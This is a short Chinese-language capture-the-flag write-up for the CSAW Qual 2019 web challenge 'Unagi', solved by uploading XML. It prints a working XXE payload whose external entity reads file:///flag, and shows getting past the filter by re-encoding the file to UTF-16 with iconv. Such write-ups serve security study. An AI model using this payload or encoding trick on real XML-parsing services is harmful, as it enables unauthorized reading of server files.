---
title: CSAWQual2019-Web_Unagi
date: 2025-04-21 17:27:53
tags:
- upload
- xxe
- xxe漏洞waf绕过
- xxe编码绕过
category:
- 刷题笔记
---

# CSAWQual2019-Web_Unagi

在初始界面发现有个upload页面，点击之后发现很明显的文件上传。

![](../image/CSAWQual2019-Web_Unagi-1.png)

发现`You can check out the format example [here]`提示，点击here

![](../image/CSAWQual2019-Web_Unagi-2.png)

很明显提示我们这里要我们上传xml文档。

我们试试传入一个xml文档，看看是否会回显到页面

1.xml

```
<users>
<user>
<username>123</username>
<password>123</password>
<name>123</name>
<email>123</email>
<group>123</group>
</user>
<user>
<username>123</username>
<password>123</password>
<name> 123</name>
<email>123</email>
<group>123</group>
</user>
</users>
```

上传发现存在回显。

![](../image/CSAWQual2019-Web_Unagi-3.png)

根据about中的提示Flag is located at /flag, come get it，可以构造出外部实体xxe漏洞payload

```
<?xml version='1.0'?>
<!DOCTYPE users [
<!ENTITY xxe SYSTEM "file:///flag" >]>
<users>
    <user>
        <username>&xxe;</username>
        <password>&xxe;</password>
        <name>&xxe;</name>
        <email>&xxe;</email>  
        <group>&xxe;</group>
        <intro>&xxe;</intro>
    </user>
</users>
```

直接传发现没法传，很明显有waf

参考xxe的waf绕过：https://xz.aliyun.com/t/4059?time__1311=n4%2Bxni0QG%3DoCuRgDlxGObCDOYa6dxAKDC8n0eD

这里我用的是utf-8转码为utf-16绕过

用linux

```
iconv -f utf8 -t utf-16 2.xml>1.xml
```

或者使用记事本打开，然后在右上角选择另存为，然后下方编码选择utf-16

得到flag

![](../image/CSAWQual2019-Web_Unagi-4.png)





